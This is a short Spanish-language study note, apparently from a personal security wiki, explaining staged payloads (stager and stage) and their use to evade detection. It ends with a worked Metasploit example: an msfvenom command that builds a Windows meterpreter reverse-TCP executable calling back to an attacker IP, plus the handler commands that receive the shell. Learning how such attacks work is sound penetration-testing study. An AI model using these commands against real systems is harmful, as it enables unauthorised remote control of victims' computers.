Un "[[payload]] staged" (carga útil escalonada) es una técnica comúnmente utilizada en la creación de exploits y herramientas de penetración en el ámbito de la ciberseguridad y la piratería informática. Consiste en dividir la carga útil en varias etapas o componentes, en lugar de enviarla completa en una sola vez. Esto puede ayudar a evadir la detección y las medidas de seguridad implementadas por el sistema objetivo.

La idea principal detrás de un "[[payload]] staged" es dividir el proceso de ataque en múltiples fases. Por lo general, consta de dos etapas principales:

1. **Fase de entrega inicial (stager)**: Esta fase es la primera parte del ataque. Su objetivo es realizar una acción mínima para establecer una conexión inicial entre el atacante y el sistema objetivo, generalmente a través de una vulnerabilidad o un vector de ataque. El stager es típicamente más pequeño y más simple que el [[payload]] principal, lo que lo hace más difícil de detectar.
2. **Fase de ejecución (stage)**: Una vez que se ha establecido la conexión inicial, el stager en el sistema objetivo ejecuta la segunda etapa del ataque, que contiene el [[payload]] principal. Este payload más grande y complejo generalmente lleva a cabo la acción deseada por el atacante, como la explotación de una vulnerabilidad, la ejecución de código malicioso, el robo de información, entre otros.

La ventaja de utilizar un "payload staged" es que puede ayudar a evadir las defensas de seguridad del sistema objetivo, ya que la entrega de la carga útil se divide en múltiples etapas y solo se ejecuta una vez que se ha establecido una conexión inicial. Además, permite a los atacantes adaptar y personalizar su carga útil para diferentes escenarios y condiciones de la red.

Ejemplo de payload staged:

En este caso estamos utilizando [[metasploit]]:

- Con el siguiente comando creamos un archivo ejecutable específicamente para la plataforma Windows:
```msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=192.168.111.45 LPORT=4646 -f exe -o reverse.exe```
- Una vez la máquina victima tiene el archivo, ingresamos a msfconsole desde la máquina atacante y aplicamos los siguientes comandos en base al sistema que estemos atacando:
```use exploit/multi/handler```
```set payload windows/x64/meterpreter/reverse_tcp```
```set LHOST 192.168.111.45``` En este caso esta es nuestra IP
```run``` Una vez esté todo configurado ya podemos correr el payload que generamos
